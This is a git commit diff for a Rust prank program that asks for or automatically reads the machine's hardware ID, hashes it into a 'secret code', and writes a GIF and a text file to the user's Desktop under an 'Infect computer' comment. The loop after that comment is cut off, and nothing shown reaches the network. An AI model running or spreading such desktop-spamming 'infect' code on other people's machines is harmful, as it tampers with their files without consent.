cc0a1bc5ce822b6a98826c7cdc633a75302bcd7c
Dex <sheepareawesome777@gmail.com>
2022-08-28 19:02:55 -0400

    MachineGUID getter

--- src/main.rs
+++ src/main.rs
@@ -4,21 +4,36 @@ use std::thread::sleep;
 use std::thread;
 use std::fs::File;
 use std::io::prelude::*;
+use std::io;
 use std::path::Path;
 
 const SPAMDELAY: u64 = 100;
 
 fn main() {
+	// Get Machine ID
+	println!("Please input your hardware ID (leave blank for auto)");
+
+	let stdin = io::stdin();
+	let mut hwid = stdin.lock().lines().next().unwrap().unwrap();
+	if hwid.trim().is_empty() {
+		hwid = machine_uid::get().unwrap();
+		println!("Using ID: {}", hwid);
+	}
+
+	let hwid_hash = sha256::digest(hwid);
+	
 	let home_folder: &str = &format!("{}", dirs::home_dir().unwrap().display())[..];
+
 
 	// Make file
 	let mut susgif = make_file(format!("{}/Desktop/amogus.gif", home_folder));
 	susgif.write_all(include_bytes!("amogus.gif")).expect("Couldn't write to file");
 
 	let mut yourfile = make_file(format!("{}/Desktop/yourfile.txt", home_folder));
-	let fcbuffer = format!("Your secret code is: '{} is a gamer 123123'", whoami::devicename());
+	let fcbuffer = format!("Your secret code is:\n{} is a gamer 123123", hwid_hash);
 	let fcontent = fcbuffer.as_bytes();
 	yourfile.write_all(fcontent).expect("Couldn't write to file");
+
 
 	// Infect computer
 	let mut iteration = 1;
